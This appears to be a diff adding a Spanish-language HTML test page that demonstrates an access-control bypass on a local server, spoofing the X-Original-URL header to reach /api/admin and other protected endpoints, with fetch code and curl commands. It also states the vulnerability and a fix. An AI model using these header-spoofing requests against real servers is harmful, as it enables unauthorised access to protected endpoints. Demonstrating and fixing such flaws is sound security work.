@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Bypass 403 Vulnerability</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            color: white;
+            text-align: center;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .test-section {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        
+        .test-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #eee;
+        }
+        
+        .test-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .test-button {
+            padding: 12px 30px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        
+        .btn-normal {
+            background: #3498db;
+            color: white;
+        }
+        
+        .btn-normal:hover {
+            background: #2980b9;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(52,152,219,0.4);
+        }
+        
+        .btn-exploit {
+            background: #e74c3c;
+            color: white;
+        }
+        
+        .btn-exploit:hover {
+            background: #c0392b;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(231,76,60,0.4);
+        }
+        
+        .test-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        
+        .test-info strong {
+            color: #2c3e50;
+        }
+        
+        .result-box {
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+        }
+        
+        .result-box.show {
+            display: block;
+        }
+        
+        .result-success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+        
+        .result-error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+        }
+        
+        .result-warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+        }
+        
+        .response-header {
+            font-weight: bold;
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
+        
+        .response-content {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .vulnerability-alert {
+            background: #ffe5e5;
+            border-left: 5px solid #e74c3c;
+            padding: 20px;
+            margin-top: 20px;
+            border-radius: 5px;
+        }
+        
+        .vulnerability-alert h3 {
+            color: #c0392b;
+            margin-bottom: 10px;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-left: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Test de Vulnerabilidad: Bypass 403</h1>
+        
+        <!-- Test 1: Acceso Normal -->
+        <div class="test-section">
+            <div class="test-header">
+                <div class="test-title">🔵 Test 1: Acceso Normal (Sin Bypass)</div>
+                <button class="test-button btn-normal" onclick="testNormal()">
+                    Ejecutar Test Normal
+                </button>
+            </div>
+            <div class="test-info">
+                <strong>URL:</strong> http://localhost:8080/api/admin<br>
+                <strong>Método:</strong> GET<br>
+                <strong>Headers:</strong> Ninguno especial<br>
+                <strong>Resultado esperado:</strong> ❌ Error 401/403 (Acceso denegado)
+            </div>
+            <div id="result1" class="result-box"></div>
+        </div>
+        
+        <!-- Test 2: Bypass con X-Original-URL -->
+        <div class="test-section">
+            <div class="test-header">
+                <div class="test-title">🔴 Test 2: Bypass con X-Original-URL</div>
+                <button class="test-button btn-exploit" onclick="testBypass()">
+                    Ejecutar Exploit
+                </button>
+            </div>
+            <div class="test-info">
+                <strong>URL:</strong> http://localhost:8080/<br>
+                <strong>Método:</strong> GET<br>
+                <strong>Headers:</strong> <span style="color: #e74c3c;">X-Original-URL: /api/admin</span><br>
+                <strong>Resultado esperado:</strong> ✅ Código 200 OK (¡Bypass exitoso!)
+            </div>
+            <div id="result2" class="result-box"></div>
+        </div>
+        
+        <!-- Test 3: Otros endpoints -->
+        <div class="test-section">
+            <div class="test-header">
+                <div class="test-title">🔴 Test 3: Probar Otros Endpoints</div>
+                <button class="test-button btn-exploit" onclick="testMultiple()">
+                    Probar Múltiples Endpoints
+                </button>
+            </div>
+            <div class="test-info">
+                <strong>Endpoints a probar:</strong><br>
+                • /api/admin/tests<br>
+                • /api/tests<br>
+                • /api<br>
+                <strong>Método:</strong> Bypass con X-Original-URL
+            </div>
+            <div id="result3" class="result-box"></div>
+        </div>
+        
+        <!-- Alerta de vulnerabilidad -->
+        <div class="vulnerability-alert">
+            <h3>⚠️ VULNERABILIDAD DETECTADA: CWE-348</h3>
+            <p><strong>Descripción:</strong> El servidor permite bypass de controles de acceso mediante el header HTTP <code>X-Original-URL</code>.</p>
+            <p><strong>Impacto:</strong> Un atacante puede acceder a endpoints protegidos (como /api/admin) sin autenticación válida.</p>
+            <p><strong>Solución:</strong> Implementar un filtro que bloquee o valide headers sospechosos antes del procesamiento de la solicitud.</p>
+        </div>
+    </div>
+
+    <script>
+        async function testNormal() {
+            const resultDiv = document.getElementById('result1');
+            resultDiv.innerHTML = '<div class="spinner"></div> Ejecutando...';
+            resultDiv.className = 'result-box show';
+            
+            try {
+                const response = await fetch('http://localhost:8080/api/admin', {
+                    method: 'GET'
+                });
+                
+                const text = await response.text();
+                const statusClass = response.ok ? 'result-success' : 'result-error';
+                
+                resultDiv.className = `result-box show ${statusClass}`;
+                resultDiv.innerHTML = `
+                    <strong>Status Code:</strong> ${response.status} ${response.statusText}<br>
+                    <strong>Content-Type:</strong> ${response.headers.get('content-type') || 'N/A'}<br>
+                    <strong>Content Length:</strong> ${text.length} bytes<br>
+                    <div class="response-header">Respuesta del servidor:</div>
+                    <div class="response-content">${escapeHtml(text.substring(0, 1000))}</div>
+                `;
+            } catch (error) {
+                resultDiv.className = 'result-box show result-error';
+                resultDiv.innerHTML = `
+                    <strong>❌ Error de red o CORS</strong><br>
+                    ${error.message}<br><br>
+                    <em>Nota: Si ves un error CORS, es normal. El servidor respondió pero el navegador bloqueó la respuesta por seguridad.</em>
+                `;
+            }
+        }
+        
+        async function testBypass() {
+            const resultDiv = document.getElementById('result2');
+            resultDiv.innerHTML = '<div class="spinner"></div> Ejecutando exploit...';
+            resultDiv.className = 'result-box show';
+            
+            try {
+                // IMPORTANTE: Los navegadores NO permiten modificar ciertos headers por seguridad
+                // Este fetch NO funcionará como esperamos porque X-Original-URL está en la lista prohibida
+                const response = await fetch('http://localhost:8080/', {
+                    method: 'GET',
+                    headers: {
+                        'X-Original-URL': '/api/admin'
+                    }
+                });
+                
+                const text = await response.text();
+                const statusClass = response.ok ? 'result-warning' : 'result-error';
+                
+                resultDiv.className = `result-box show ${statusClass}`;
+                resultDiv.innerHTML = `
+                    <strong>⚠️ LIMITACIÓN DEL NAVEGADOR</strong><br><br>
+                    Los navegadores modernos NO permiten modificar ciertos headers HTTP por seguridad,
+                    incluyendo X-Original-URL.<br><br>
+                    <strong>Para probar esta vulnerabilidad, usa:</strong><br>
+                    • Extensión ModHeader para Chrome/Edge<br>
+                    • Postman o cURL<br>
+                    • El script PowerShell: demo-bypass-visual.ps1<br><br>
+                    <strong>Status Code:</strong> ${response.status}<br>
+                    <div class="response-content">${escapeHtml(text.substring(0, 500))}</div>
+                `;
+            } catch (error) {
+                resultDiv.className = 'result-box show result-warning';
+                resultDiv.innerHTML = `
+                    <strong>⚠️ LIMITACIÓN DEL NAVEGADOR</strong><br><br>
+                    Los navegadores modernos NO permiten modificar el header X-Original-URL directamente desde JavaScript.<br><br>
+                    <strong>Para explotar esta vulnerabilidad, necesitas usar:</strong><br>
+                    1. 🔧 <strong>Extensión de navegador</strong> como ModHeader<br>
+                    2. 📮 <strong>Postman</strong> o herramientas similares<br>
+                    3. 💻 <strong>cURL</strong> desde terminal<br>
+                    4. ⚡ <strong>PowerShell</strong>: Ejecuta demo-bypass-visual.ps1<br><br>
+                    <em>Error: ${error.message}</em>
+                `;
+            }
+        }
+        
+        async function testMultiple() {
+            const resultDiv = document.getElementById('result3');
+            resultDiv.innerHTML = '<div class="spinner"></div> Probando múltiples endpoints...';
+            resultDiv.className = 'result-box show result-warning';
+            
+            setTimeout(() => {
+                resultDiv.innerHTML = `
+                    <strong>⚠️ Esta prueba requiere herramientas externas</strong><br><br>
+                    Para probar múltiples endpoints con el bypass, ejecuta:<br><br>
+                    <div class="response-content">
+# PowerShell
+cd devdoc
+.\\demo-bypass-visual.ps1
+
+# O usar cURL
+curl -H "X-Original-URL: /api/admin/tests" http://localhost:8080/
+curl -H "X-Original-URL: /api/tests" http://localhost:8080/
+curl -H "X-Original-URL: /api" http://localhost:8080/
+                    </div>
+                `;
+            }, 1000);
+        }
+        
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+    </script>
+</body>
+</html>
